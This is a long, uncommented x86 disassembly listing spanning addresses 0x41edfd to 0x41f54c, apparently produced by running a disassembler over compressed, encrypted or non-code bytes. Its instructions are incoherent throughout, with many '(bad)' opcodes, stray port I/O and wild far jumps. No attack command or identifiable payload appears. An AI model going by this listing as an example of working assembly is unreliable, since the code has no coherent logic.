  41edfd:	lock and eax,0x6d382ef9
  41ee03:	je     0x41edaa
  41ee05:	stc    
  41ee06:	loope  0x41ee6e
  41ee08:	pop    esi
  41ee09:	test   BYTE PTR [edx-0x6edbe710],ch
  41ee0f:	bound  esi,QWORD PTR [esi-0x70]
  41ee12:	icebp  
  41ee13:	leave  
  41ee14:	sti    
  41ee15:	mov    WORD PTR [edi-0x62057723],cs
  41ee1b:	ret    0x6c54
  41ee1e:	test   al,0xa1
  41ee20:	dec    ecx
  41ee21:	mov    edx,0x9c289ce0
  41ee26:	gs xchg ebx,eax
  41ee28:	popf   
  41ee29:	inc    eax
  41ee2a:	aas    
  41ee2b:	mov    ch,0xfe
  41ee2d:	adc    eax,DWORD PTR [edi+0x4f]
  41ee30:	inc    eax
  41ee31:	jnp    0x41eded
  41ee33:	dec    ebx
  41ee34:	fnstcw WORD PTR [esi+0x34a7931f]
  41ee3a:	adc    DWORD PTR [edx-0x6a86b5b9],ecx
  41ee40:	ja     0x41edd4
  41ee42:	pop    esi
  41ee43:	pop    esp
  41ee44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee45:	loopne 0x41ee27
  41ee47:	test   dh,dh
  41ee49:	sbb    edx,0xb4b03e37
  41ee4f:	repnz test al,0x89
  41ee52:	retf   0xba2d
  41ee55:	popa   
  41ee56:	push   cs
  41ee57:	sub    al,0xd4
  41ee59:	or     DWORD PTR [eax-0x3bf031ff],edi
  41ee5f:	adc    eax,0x69b7e449
  41ee64:	int3   
  41ee65:	mov    BYTE PTR [eax-0x1a829897],0xd1
  41ee6c:	in     eax,dx
  41ee6d:	outs   dx,BYTE PTR ds:[esi]
  41ee6e:	mov    edx,0xa4812149
  41ee73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee74:	popf   
  41ee75:	push   edx
  41ee76:	xchg   edx,eax
  41ee77:	push   ecx
  41ee78:	mov    esi,0x5b883d91
  41ee7d:	out    dx,eax
  41ee7e:	sbb    cl,cl
  41ee80:	je     0x41ee6b
  41ee82:	scas   al,BYTE PTR es:[edi]
  41ee83:	or     dh,BYTE PTR [ecx-0x7a]
  41ee86:	cmp    DWORD PTR [edx+0x2f],esi
  41ee89:	sbb    BYTE PTR [esi-0x79],dh
  41ee8c:	loopne 0x41eed8
  41ee8e:	fldenv fs:[ebx-0x62]
  41ee92:	jg     0x41eeb8
  41ee94:	arpl   WORD PTR [eax],bx
  41ee96:	repz jge 0x41eec5
  41ee99:	and    DWORD PTR [edx-0x60],eax
  41ee9c:	in     eax,dx
  41ee9d:	scas   al,BYTE PTR es:[edi]
  41ee9e:	stc    
  41ee9f:	sub    bl,BYTE PTR [ecx-0x227e1dd5]
  41eea5:	in     al,0xe0
  41eea7:	xor    BYTE PTR [edi+0x624fd86],ch
  41eead:	lea    edi,[eax-0x17]
  41eeb0:	jp     0x41ef18
  41eeb2:	dec    eax
  41eeb3:	sub    al,0xa2
  41eeb5:	xchg   edx,eax
  41eeb6:	xchg   BYTE PTR [eax-0x17],al
  41eeb9:	jbe    0x41eef8
  41eebb:	repz xor BYTE PTR [ebx+esi*2+0x682112f9],0xda
  41eec4:	or     DWORD PTR [edi+0x4a906335],edi
  41eeca:	adc    BYTE PTR [esi+0x7f],0x7f
  41eece:	pop    edx
  41eecf:	cmp    DWORD PTR [ebp-0x11],0xa9682ff2
  41eed6:	xlat   BYTE PTR ds:[ebx]
  41eed7:	dec    ebp
  41eed8:	(bad)  
  41eed9:	fadd   DWORD PTR [ecx-0x3]
  41eedc:	or     DWORD PTR [ebp-0x3],ebx
  41eedf:	push   ebx
  41eee0:	xchg   edi,eax
  41eee1:	je     0x41eec1
  41eee3:	daa    
  41eee4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eee5:	lods   eax,DWORD PTR ds:[esi]
  41eee6:	clc    
  41eee7:	sbb    eax,0xc402c69a
  41eeec:	fisubr DWORD PTR [eax]
  41eeee:	iret   
  41eeef:	dec    edi
  41eef0:	int    0x48
  41eef2:	sub    ah,bl
  41eef4:	call   0x3a52a7ce
  41eef9:	bound  ebx,QWORD PTR [ecx+0x71]
  41eefc:	and    esi,DWORD PTR [esi+0x27]
  41eeff:	fcomp  QWORD PTR [ecx-0x5d97fc93]
  41ef05:	or     al,0x60
  41ef07:	pusha  
  41ef08:	(bad)  
  41ef09:	jne    0x41ee97
  41ef0b:	dec    edi
  41ef0c:	cs stos BYTE PTR es:[edi],al
  41ef0e:	fdivr  DWORD PTR [esi-0x1bfc935b]
  41ef14:	and    al,ch
  41ef16:	jle    0x41ef97
  41ef18:	fistp  QWORD PTR [ebx]
  41ef1a:	lds    eax,FWORD PTR [eax-0x6ae73425]
  41ef20:	es out 0x1d,al
  41ef23:	inc    esp
  41ef24:	stc    
  41ef25:	mov    edi,0xda16cf3f
  41ef2a:	mov    ch,0x67
  41ef2c:	jnp    0x41ef37
  41ef2e:	pop    ss
  41ef2f:	inc    edx
  41ef30:	cwde   
  41ef31:	jo     0x41ef61
  41ef33:	rcr    DWORD PTR [ebp*1+0x1e4088eb],cl
  41ef3a:	cmp    esi,DWORD PTR [eax+0x742dfbef]
  41ef40:	enter  0x33a4,0xa8
  41ef44:	push   ebp
  41ef45:	mov    ch,0x9b
  41ef47:	sar    ah,cl
  41ef49:	sbb    DWORD PTR [ecx],esp
  41ef4b:	jns    0x41efbb
  41ef4d:	cmp    edi,ebx
  41ef4f:	xchg   esp,eax
  41ef50:	dec    BYTE PTR [edi-0x60dcc8ab]
  41ef56:	fimul  WORD PTR gs:[ecx+0x76]
  41ef5a:	or     cl,cl
  41ef5c:	test   al,0x9b
  41ef5e:	jnp    0x604558c6
  41ef64:	and    edi,DWORD PTR ds:0x42bb56bb
  41ef6a:	ret    0xa652
  41ef6d:	jbe    0x41efd3
  41ef6f:	int    0xa3
  41ef71:	push   ds
  41ef72:	push   cs
  41ef73:	mov    ds:0x7a9ec0da,al
  41ef78:	or     eax,0x981e6685
  41ef7d:	pop    es
  41ef7e:	sbb    BYTE PTR [eax+0x44],0x96
  41ef82:	jne    0x41efcc
  41ef84:	mul    DWORD PTR [ebx+0x3]
  41ef87:	or     al,0x3b
  41ef89:	push   ds
  41ef8a:	pusha  
  41ef8b:	and    eax,0xb926eaf0
  41ef90:	daa    
  41ef91:	push   esp
  41ef92:	test   ch,ah
  41ef94:	push   0xffffffe6
  41ef96:	jne    0x41f005
  41ef98:	imul   ebx,ebx,0xe4080b92
  41ef9e:	xchg   esp,eax
  41ef9f:	into   
  41efa0:	fstp   QWORD PTR [edx-0x7272d2fb]
  41efa6:	out    0x33,eax
  41efa8:	nop
  41efa9:	lods   al,BYTE PTR ds:[esi]
  41efaa:	adc    BYTE PTR [ebx+0x5ea6c9d8],ch
  41efb0:	imul   edi,DWORD PTR [esp+edx*4+0x11],0x6e31b1e0
  41efb8:	into   
  41efb9:	dec    edx
  41efba:	xchg   BYTE PTR [edx+0x16],ch
  41efbd:	add    eax,0x34bd7556
  41efc2:	mov    ebx,0x68bd0154
  41efc7:	inc    esp
  41efc8:	in     al,dx
  41efc9:	jns    0x41f018
  41efcb:	into   
  41efcc:	lahf   
  41efcd:	in     al,dx
  41efce:	adc    BYTE PTR [ecx-0x1c],ah
  41efd1:	cwde   
  41efd2:	mov    eax,ds:0x80592230
  41efd7:	bound  eax,QWORD PTR [edi]
  41efd9:	inc    eax
  41efda:	push   ecx
  41efdb:	addr16 add eax,0xd3818a94
  41efe1:	(bad)  
  41efe2:	jnp    0x41ef74
  41efe4:	lock test eax,0xf90a8e3e
  41efea:	vpunpckhdq xmm7,xmm7,xmm6
  41efee:	cmp    DWORD PTR [ebp-0x476d8e77],esp
  41eff4:	jp     0x41efe6
  41eff6:	add    eax,0x6338bdfe
  41effb:	fisub  DWORD PTR [ebx]
  41effd:	(bad)  
  41effe:	div    DWORD PTR [esi]
  41f000:	into   
  41f001:	test   DWORD PTR [ebx+0x4d],ecx
  41f004:	scas   al,BYTE PTR es:[edi]
  41f005:	das    
  41f006:	lods   al,BYTE PTR ds:[esi]
  41f007:	jmp    0xa417:0x545bd92e
  41f00e:	ret    0x5d84
  41f011:	in     al,0x32
  41f013:	dec    edx
  41f014:	out    0x55,al
  41f016:	test   esi,ecx
  41f018:	adc    ebx,DWORD PTR [ebx]
  41f01a:	sub    eax,0x447b8106
  41f01f:	cdq    
  41f020:	mov    edx,0xe3b9d948
  41f025:	pop    ds
  41f026:	pop    edx
  41f027:	std    
  41f028:	pushf  
  41f029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f02a:	jg     0x41f027
  41f02c:	push   edx
  41f02d:	repz fldenv [ecx]
  41f030:	daa    
  41f031:	in     al,dx
  41f032:	cmp    bh,bh
  41f034:	test   BYTE PTR [edx+0x38d31dce],0x6b
  41f03b:	sbb    ch,BYTE PTR [eax+0x59]
  41f03e:	fs pop ds
  41f040:	xchg   ecx,eax
  41f041:	push   ss
  41f042:	fld    QWORD PTR [eax-0x5c8da2a3]
  41f048:	dec    eax
  41f049:	cdq    
  41f04a:	loopne 0x41f082
  41f04c:	dec    eax
  41f04d:	xor    edx,DWORD PTR [edx-0x64c3bbd1]
  41f053:	jl     0x41efef
  41f055:	pop    es
  41f056:	pop    ebx
  41f057:	xchg   ecx,eax
  41f058:	xor    DWORD PTR [edx-0x369066ec],esp
  41f05e:	mov    ecx,0x38e533b4
  41f063:	mul    BYTE PTR ds:0x3c712fa2
  41f069:	js     0x41f01d
  41f06b:	cmc    
  41f06c:	stc    
  41f06d:	xchg   BYTE PTR [ebp-0x46],dl
  41f070:	jne    0x41f06d
  41f072:	xchg   ecx,eax
  41f073:	call   0x2144:0x2f87e081
  41f07a:	lds    esp,FWORD PTR [ecx+0x330556c7]
  41f080:	push   eax
  41f081:	add    DWORD PTR [ecx],ecx
  41f083:	sahf   
  41f084:	jle    0x41f08d
  41f086:	jp     0x41f0cb
  41f088:	inc    esi
  41f089:	adc    ch,BYTE PTR [edx-0x74f8a8b2]
  41f08f:	xlat   BYTE PTR ds:[ebx]
  41f090:	pop    es
  41f091:	sahf   
  41f092:	out    0x1e,eax
  41f094:	test   eax,0xd52eae1e
  41f099:	jp     0x41f087
  41f09b:	iret   
  41f09c:	xchg   esp,eax
  41f09d:	test   al,0xa5
  41f09f:	adc    edx,0xffffffa5
  41f0a2:	jb     0x41f064
  41f0a4:	loop   0x41f0a2
  41f0a6:	push   ebx
  41f0a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0a8:	ds push es
  41f0aa:	fld    DWORD PTR [eax+0x53ea232d]
  41f0b0:	push   cs
  41f0b1:	(bad)  
  41f0b2:	or     ah,BYTE PTR [ecx+esi*1-0x7b6baebf]
  41f0b9:	fidiv  WORD PTR [eax]
  41f0bb:	stc    
  41f0bc:	cld    
  41f0bd:	xor    eax,0x4d5668aa
  41f0c2:	sub    BYTE PTR [edi+0x621db448],dl
  41f0c8:	jg     0x41f08b
  41f0ca:	(bad)  
  41f0cb:	(bad)  
  41f0cc:	push   ds
  41f0cd:	xor    BYTE PTR [ecx-0x6a],al
  41f0d0:	push   ss
  41f0d1:	inc    edi
  41f0d2:	int3   
  41f0d3:	jne    0x41f06b
  41f0d5:	inc    ebx
  41f0d6:	mov    ecx,?
  41f0d8:	(bad)  [esi+0x4f]
  41f0db:	outs   dx,BYTE PTR ds:[esi]
  41f0dc:	add    BYTE PTR [edx+0x9],bh
  41f0df:	setns  bl
  41f0e2:	add    cl,BYTE PTR [edx]
  41f0e4:	and    al,0xd2
  41f0e6:	pop    ebp
  41f0e7:	scas   al,BYTE PTR es:[edi]
  41f0e8:	aam    0xc
  41f0ea:	push   es
  41f0eb:	js     0x41f077
  41f0ed:	mov    cl,0x20
  41f0ef:	and    al,0x57
  41f0f1:	cmp    DWORD PTR [edx+0x23],0x45
  41f0f5:	adc    BYTE PTR [edi],bh
  41f0f7:	stos   DWORD PTR es:[edi],eax
  41f0f8:	mov    ds:0x3f326b9d,eax
  41f0fd:	or     al,0x4a
  41f0ff:	retf   
  41f100:	and    ebp,DWORD PTR [esi]
  41f102:	in     eax,dx
  41f103:	cdq    
  41f104:	pop    ds
  41f105:	ret    
  41f106:	stc    
  41f107:	inc    esp
  41f108:	pop    ds
  41f109:	popa   
  41f10a:	dec    eax
  41f10b:	mov    ch,0x94
  41f10d:	scas   al,BYTE PTR es:[edi]
  41f10e:	mov    ebp,0x9fb12960
  41f113:	rol    BYTE PTR [ebx+0xaf0bae5],1
  41f119:	test   eax,0xd9ba170f
  41f11e:	out    dx,eax
  41f11f:	jb     0x41f15d
  41f121:	and    al,0x6
  41f123:	pusha  
  41f124:	out    0x5c,al
  41f126:	mov    edi,0x94f7a668
  41f12b:	pop    ecx
  41f12c:	jb     0x41f16a
  41f12e:	test   BYTE PTR [eax-0x2c],0xfc
  41f132:	mov    ebp,0x64c0d394
  41f137:	jo     0x41f123
  41f139:	fisttp DWORD PTR [ebx+0xf9ca822]
  41f13f:	mov    bh,0x7d
  41f141:	mov    ds:0x3f4b6a8e,al
  41f146:	aaa    
  41f147:	push   ds
  41f148:	xchg   ecx,eax
  41f149:	out    0x29,al
  41f14b:	inc    esi
  41f14c:	add    al,0xe2
  41f14e:	mov    al,0x94
  41f150:	test   al,0xae
  41f152:	mov    BYTE PTR [edi+0x3a],ah
  41f155:	pop    ss
  41f156:	aad    0x11
  41f158:	mov    eax,ds:0x862325c1
  41f15d:	into   
  41f15e:	pop    ss
  41f15f:	(bad)  
  41f160:	fld    QWORD PTR [esi]
  41f162:	aad    0x22
  41f164:	sar    dl,0x6e
  41f167:	sbb    eax,0x622975e0
  41f16c:	pop    eax
  41f16d:	dec    eax
  41f16e:	hlt    
  41f16f:	jns    0x41f19b
  41f171:	in     al,dx
  41f172:	mov    ecx,0x31f0eefd
  41f177:	fbstp  TBYTE PTR [esi]
  41f179:	xchg   ebx,eax
  41f17a:	add    al,0x70
  41f17c:	shl    DWORD PTR [ebp+ecx*4-0x17],0x66
  41f181:	ja     0x41f11e
  41f183:	mov    dl,BYTE PTR [ecx+ebp*4]
  41f186:	lods   eax,DWORD PTR ds:[esi]
  41f187:	or     ebp,edx
  41f189:	push   0xfffffff0
  41f18b:	bswap  esi
  41f18d:	ret    0x6463
  41f190:	and    al,0xa7
  41f192:	in     al,dx
  41f193:	push   edi
  41f194:	pop    esp
  41f195:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f196:	sti    
  41f197:	dec    eax
  41f198:	adc    esp,ebx
  41f19a:	or     BYTE PTR ds:0x3bc8f896,cl
  41f1a0:	jecxz  0x41f202
  41f1a2:	pop    ecx
  41f1a3:	mov    edx,0xe3c15606
  41f1a8:	fist   WORD PTR [ebx+0x31]
  41f1ab:	nop
  41f1ac:	xchg   edx,eax
  41f1ad:	gs lahf 
  41f1af:	les    edx,FWORD PTR [ebp+0x15c1eec4]
  41f1b5:	retf   
  41f1b6:	dec    eax
  41f1b7:	dec    esp
  41f1b8:	xchg   esp,eax
  41f1b9:	xor    DWORD PTR [edx+esi*2],edi
  41f1bc:	test   ch,bl
  41f1be:	mov    al,0x32
  41f1c0:	ins    DWORD PTR es:[edi],dx
  41f1c1:	or     al,0xb1
  41f1c3:	loope  0x41f149
  41f1c5:	shl    BYTE PTR [ebx+0x55],0xdc
  41f1c9:	pushf  
  41f1ca:	mov    esp,0x15b015e
  41f1cf:	sbb    DWORD PTR [ecx+edi*4],ecx
  41f1d2:	push   ss
  41f1d3:	lock cld 
  41f1d5:	aas    
  41f1d6:	retf   0x1954
  41f1d9:	les    esp,FWORD PTR [edi-0x2a799d56]
  41f1df:	dec    eax
  41f1e0:	xchg   ebp,eax
  41f1e1:	mov    bh,0xde
  41f1e3:	mov    cs,WORD PTR cs:[edx+0x78]
  41f1e7:	fld    TBYTE PTR ss:[edi-0x5ed67190]
  41f1ee:	push   edx
  41f1ef:	xor    BYTE PTR [ecx],cl
  41f1f1:	inc    ebx
  41f1f2:	cmp    dh,BYTE PTR [edx]
  41f1f4:	adc    BYTE PTR [edx-0x29],al
  41f1f7:	mov    bl,0xd6
  41f1f9:	xor    ebx,DWORD PTR [eax]
  41f1fb:	setae  ah
  41f1fe:	cmp    al,0xa1
  41f200:	scas   eax,DWORD PTR es:[edi]
  41f201:	shr    BYTE PTR [edx],0xab
  41f204:	pop    eax
  41f205:	mov    bl,0x4f
  41f207:	or     BYTE PTR [eax],bh
  41f209:	xor    BYTE PTR [edi],bl
  41f20b:	adc    DWORD PTR es:[edx-0x6e8911e3],0x6a9996e3
  41f216:	cld    
  41f217:	les    esi,FWORD PTR [ebx]
  41f219:	xor    al,0xb9
  41f21b:	je     0x41f201
  41f21d:	mov    ebx,0x17b61b03
  41f222:	dec    ebx
  41f223:	inc    eax
  41f224:	xor    eax,0xe57b03b2
  41f229:	into   
  41f22a:	xlat   BYTE PTR ds:[ebx]
  41f22b:	ret    
  41f22c:	push   ds
  41f22d:	repnz test BYTE PTR [edi-0x7f10bc8e],bh
  41f234:	adc    edx,DWORD PTR [edx-0x3d1d951e]
  41f23a:	xchg   edi,eax
  41f23b:	std    
  41f23c:	xchg   esp,eax
  41f23d:	int3   
  41f23e:	mov    cl,0x68
  41f240:	push   0x59693f9c
  41f245:	inc    esp
  41f246:	lods   eax,DWORD PTR ds:[esi]
  41f247:	in     eax,dx
  41f248:	jl     0x41f211
  41f24a:	pop    edx
  41f24b:	mov    cl,0xb8
  41f24d:	cmp    ebx,DWORD PTR [ebx+0x33]
  41f250:	dec    eax
  41f251:	cmp    al,0x74
  41f253:	xlat   BYTE PTR ds:[ebx]
  41f254:	lods   al,BYTE PTR ds:[esi]
  41f255:	mov    eax,esp
  41f257:	es jge 0x41f2a1
  41f25a:	xchg   esi,eax
  41f25b:	pop    ds
  41f25c:	and    eax,0x577a1884
  41f261:	sbb    edx,DWORD PTR [ebx]
  41f263:	jno    0x41f2d1
  41f265:	pop    ebx
  41f266:	xchg   ebx,eax
  41f267:	fs push es
  41f269:	in     al,dx
  41f26a:	push   0x8aae543c
  41f26f:	push   cs
  41f270:	inc    esi
  41f271:	xor    edi,eax
  41f273:	inc    ebp
  41f274:	mov    dl,0x8f
  41f276:	add    al,0x7f
  41f278:	lods   eax,DWORD PTR ds:[esi]
  41f279:	ins    DWORD PTR es:[edi],dx
  41f27a:	call   0xed0d:0x1b5f0d49
  41f281:	sub    bl,BYTE PTR [ebp-0x42]
  41f284:	lea    ebx,ds:0x3e72912b
  41f28a:	daa    
  41f28b:	xchg   DWORD PTR [edx],esi
  41f28d:	add    ecx,DWORD PTR [esi-0x6a]
  41f290:	mov    ebx,?
  41f292:	sti    
  41f293:	in     eax,0x42
  41f295:	retf   
  41f296:	dec    edi
  41f297:	stos   BYTE PTR es:[edi],al
  41f298:	dec    eax
  41f299:	jl     0x41f277
  41f29b:	adc    esp,edi
  41f29d:	out    0x26,al
  41f29f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2a0:	jl     0x41f2f0
  41f2a2:	out    0x71,eax
  41f2a4:	xchg   ebp,eax
  41f2a5:	inc    esp
  41f2a6:	pop    ds
  41f2a7:	mov    ds:0xa9c8b9ab,al
  41f2ac:	pop    ebx
  41f2ad:	jns    0x41f2bf
  41f2af:	jl     0x41f29b
  41f2b1:	neg    BYTE PTR [edi+0x59bd3357]
  41f2b7:	ret    
  41f2b8:	fistp  WORD PTR [edi-0x363e6e6a]
  41f2be:	aas    
  41f2bf:	push   edi
  41f2c0:	pop    eax
  41f2c1:	stc    
  41f2c2:	ins    BYTE PTR es:[edi],dx
  41f2c3:	arpl   WORD PTR [eax+0x3d03b45b],di
  41f2c9:	ret    
  41f2ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2cb:	lea    ebp,[esi-0x23]
  41f2ce:	inc    esi
  41f2cf:	push   ecx
  41f2d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2d1:	fwait
  41f2d2:	mov    dl,0x87
  41f2d4:	nop
  41f2d5:	pop    esi
  41f2d6:	jb     0x41f2e2
  41f2d8:	paddq  mm2,QWORD PTR [esi]
  41f2db:	out    dx,al
  41f2dc:	dec    ebp
  41f2dd:	es sahf 
  41f2df:	mov    esi,DWORD PTR [edi+0x6b]
  41f2e2:	dec    edx
  41f2e3:	cwde   
  41f2e4:	adc    ebx,DWORD PTR [ebx]
  41f2e6:	or     DWORD PTR [ecx-0x2857e8df],0xffffffbf
  41f2ed:	inc    ebx
  41f2ee:	dec    ebp
  41f2ef:	pop    ecx
  41f2f0:	adc    al,0xe0
  41f2f2:	mov    ebp,0x218a0fb3
  41f2f7:	(bad)  
  41f2f8:	xor    eax,0xe67abac9
  41f2fd:	push   es
  41f2fe:	mov    ecx,0x1d325b6e
  41f303:	rcl    bl,0x3e
  41f306:	inc    ebx
  41f307:	(bad)  
  41f308:	les    eax,FWORD PTR [edi-0x1d]
  41f30b:	mov    WORD PTR [ebx*1-0x1844a9a3],es
  41f312:	ds int 0xad
  41f315:	xor    DWORD PTR ds:0xe0fde825,0xef603f5d
  41f31f:	(bad)  
  41f320:	pop    edi
  41f321:	loope  0x41f2c6
  41f323:	fstp   DWORD PTR [edx-0x4c397c33]
  41f329:	dec    eax
  41f32a:	cmp    BYTE PTR [esi],dh
  41f32c:	sbb    BYTE PTR [ebx+0x38],al
  41f32f:	inc    esp
  41f330:	sar    BYTE PTR [esi-0x27c5d7e8],0xf7
  41f337:	repz dec ebx
  41f339:	mov    al,ds:0x826e8d32
  41f33e:	add    esp,edx
  41f340:	rcr    DWORD PTR ds:0x2477d48e,cl
  41f346:	shr    BYTE PTR [edi+ebp*4+0x4e5f91e4],0xe4
  41f34e:	cdq    
  41f34f:	js     0x41f320
  41f351:	imul   eax,DWORD PTR [esi+edi*4-0x6b],0xffffffcf
  41f356:	sub    esi,DWORD PTR [ebx+0x33]
  41f359:	hlt    
  41f35a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f35b:	xor    dh,cl
  41f35d:	(bad)  
  41f35e:	and    BYTE PTR [esi],cl
  41f360:	imul   ecx,DWORD PTR [esi+0x754698bd],0x3d
  41f367:	dec    esp
  41f368:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f369:	push   0xffffffa9
  41f36b:	jno    0x41f397
  41f36d:	shl    DWORD PTR [ebx],cl
  41f36f:	xchg   ecx,eax
  41f370:	icebp  
  41f371:	jo     0x41f3ab
  41f373:	rcr    esp,cl
  41f375:	mov    al,ds:0x348a56fe
  41f37a:	add    BYTE PTR [ebp+0x4b09a285],dl
  41f380:	mov    ebp,gs
  41f382:	data16 (bad) [ebx-0x4a5220c0]
  41f389:	mov    ebx,0x73af456d
  41f38e:	rcl    BYTE PTR [edx],0x70
  41f391:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f392:	xor    edx,esp
  41f394:	data16 repz sbb al,0x50
  41f398:	mov    dl,0xbf
  41f39a:	dec    ecx
  41f39b:	mov    dl,0xf0
  41f39d:	jle    0x41f362
  41f39f:	cmp    BYTE PTR [ecx-0x6d44b1b0],dl
  41f3a5:	and    ebx,ebx
  41f3a7:	rol    ah,0x97
  41f3aa:	push   ecx
  41f3ab:	pop    ebx
  41f3ac:	mov    BYTE PTR [edx+0x77075bcc],ch
  41f3b2:	repnz xchg esi,eax
  41f3b4:	inc    esi
  41f3b5:	mov    cl,0x45
  41f3b7:	cwde   
  41f3b8:	jmp    0x41f384
  41f3ba:	cmp    BYTE PTR [ecx-0x4108a4ad],dl
  41f3c0:	adc    dh,0xb1
  41f3c3:	pop    ebp
  41f3c4:	(bad)  
  41f3c5:	jns    0x41f39a
  41f3c7:	or     dh,BYTE PTR [ecx+0x7035cd82]
  41f3cd:	push   ebx
  41f3ce:	and    BYTE PTR [ebx-0x7787092a],0x56
  41f3d5:	mov    al,0xc0
  41f3d7:	ret    
  41f3d8:	cmp    DWORD PTR [ebp-0x59],edx
  41f3db:	adc    esi,eax
  41f3dd:	pusha  
  41f3de:	jge    0x41f423
  41f3e0:	jecxz  0x41f380
  41f3e2:	(bad)  
  41f3e3:	and    al,0xc
  41f3e5:	jmp    0xecd0c8e0
  41f3ea:	cmp    BYTE PTR [eax],dl
  41f3ec:	popa   
  41f3ed:	pop    ecx
  41f3ee:	popf   
  41f3ef:	dec    esi
  41f3f0:	(bad)  
  41f3f1:	dec    ebx
  41f3f2:	pop    eax
  41f3f3:	inc    esp
  41f3f4:	cmp    al,0xc8
  41f3f6:	std    
  41f3f7:	xchg   ecx,eax
  41f3f8:	aam    0x65
  41f3fa:	sub    dh,BYTE PTR [esp+edi*1]
  41f3fd:	cmp    eax,0x5b2e5ee
  41f402:	mov    edx,DWORD PTR [edx+ebp*4]
  41f405:	shl    eax,0xb5
  41f408:	retf   0xc435
  41f40b:	cmp    DWORD PTR [eax],edi
  41f40d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f40e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f40f:	or     cl,BYTE PTR [eax+0x68]
  41f412:	mov    ecx,0x544fa02f
  41f417:	pop    es
  41f418:	mov    eax,ds:0x8694a506
  41f41d:	icebp  
  41f41e:	mov    ds:0x27998790,al
  41f423:	pop    esi
  41f424:	imul   ebp,DWORD PTR [ecx-0x130b2445],0xfffffff0
  41f42b:	test   eax,0x57443bf4
  41f430:	or     al,0xa0
  41f432:	fdiv   st,st(2)
  41f434:	mov    edx,0xe16b852c
  41f439:	jge    0x41f3cc
  41f43b:	add    edx,DWORD PTR [eax+esi*2+0x118d6867]
  41f442:	lock ror edi,1
  41f445:	std    
  41f446:	xchg   esi,eax
  41f447:	or     eax,0x979f9e5f
  41f44c:	test   eax,0xa61d6df7
  41f451:	retf   0x7b7
  41f454:	add    DWORD PTR [edi+0x5b],esi
  41f457:	and    BYTE PTR [edi-0x52],dl
  41f45a:	xchg   DWORD PTR [edx+0x1b363ea5],edx
  41f460:	rcl    BYTE PTR [eax+0x39405c4f],cl
  41f466:	lock into 
  41f468:	mov    esp,0xefc77ec3
  41f46d:	outs   dx,DWORD PTR ds:[esi]
  41f46e:	(bad)  
  41f46f:	gs pop ebp
  41f471:	ss aam 0xcc
  41f474:	test   al,0x94
  41f476:	xlat   BYTE PTR ds:[ebx]
  41f477:	mov    ebx,0x819a624a
  41f47c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f47d:	faddp  st(0),st
  41f47f:	xchg   esp,eax
  41f480:	nop
  41f481:	fld    DWORD PTR [edx+0x235669e9]
  41f487:	not    DWORD PTR [eax]
  41f489:	sbb    BYTE PTR [eax],al
  41f48b:	jae    0x41f45c
  41f48d:	mov    ecx,0x1ff2bf7
  41f492:	sub    al,0x5c
  41f494:	xchg   BYTE PTR [eax+ebp*8],dl
  41f497:	mov    ds:0x6e03188d,eax
  41f49c:	sub    edi,ecx
  41f49e:	clc    
  41f49f:	cmp    eax,0xf80a8091
  41f4a4:	stos   BYTE PTR es:[edi],al
  41f4a5:	add    eax,0x32308dc8
  41f4aa:	ss push ds
  41f4ac:	out    dx,al
  41f4ad:	mov    ?,WORD PTR [ebx+0xfd172e5]
  41f4b3:	(bad)  ds:0x660cfc9c
  41f4b9:	repz or esp,DWORD PTR [ecx+0x1f]
  41f4bd:	es cs sbb cl,dl
  41f4c1:	mov    gs,WORD PTR [ebx+0x50116fd3]
  41f4c7:	lods   al,BYTE PTR ds:[esi]
  41f4c8:	idiv   DWORD PTR [esi-0x51]
  41f4cb:	mov    al,0x8e
  41f4cd:	inc    esi
  41f4ce:	inc    esi
  41f4cf:	test   al,0x3e
  41f4d1:	sahf   
  41f4d2:	jp     0x41f545
  41f4d4:	cmp    bl,bl
  41f4d6:	xchg   edi,eax
  41f4d7:	or     edi,ebp
  41f4d9:	sbb    BYTE PTR [ebx-0x408aace],cl
  41f4df:	xchg   edx,eax
  41f4e0:	dec    ebp
  41f4e1:	or     DWORD PTR [edi],esp
  41f4e3:	(bad)  
  41f4e4:	and    eax,0x56020334
  41f4e9:	clc    
  41f4ea:	sub    bl,BYTE PTR [ebx-0x7cc0a6c4]
  41f4f0:	sbb    ah,cl
  41f4f2:	cmp    BYTE PTR [eax],bh
  41f4f4:	das    
  41f4f5:	jg     0x41f49f
  41f4f7:	test   esp,esi
  41f4f9:	add    DWORD PTR [eax],ebx
  41f4fb:	jge    0x41f48f
  41f4fd:	sahf   
  41f4fe:	xor    edx,DWORD PTR [esi-0x29]
  41f501:	out    0xf7,al
  41f503:	push   es
  41f504:	out    dx,al
  41f505:	shr    bl,0xbd
  41f508:	jge    0x41f578
  41f50a:	mov    bl,0x4c
  41f50c:	sbb    al,0x2c
  41f50e:	popf   
  41f50f:	cmp    ebp,DWORD PTR [edx]
  41f511:	div    BYTE PTR [ebx]
  41f513:	les    edx,FWORD PTR [edi]
  41f515:	shl    DWORD PTR [edx+0x24],1
  41f518:	cs inc esp
  41f51a:	adc    eax,0x79aa3d3a
  41f51f:	clc    
  41f520:	aad    0x4a
  41f522:	push   ss
  41f523:	cmp    eax,0xdab4cb6b
  41f528:	cmp    eax,0x24e7fabe
  41f52d:	pop    eax
  41f52e:	dec    edi
  41f52f:	xor    BYTE PTR [eax],dl
  41f531:	sbb    eax,0x72f5a094
  41f536:	push   eax
  41f537:	retf   0xe7a3
  41f53a:	scas   eax,DWORD PTR es:[edi]
  41f53b:	adc    bh,BYTE PTR [edi-0x2ff5314f]
  41f541:	sbb    BYTE PTR ds:0xeec94015,bh
  41f547:	stos   BYTE PTR es:[edi],al
  41f548:	(bad)  
  41f54b:	int3   
  41f54c:	dec    esi
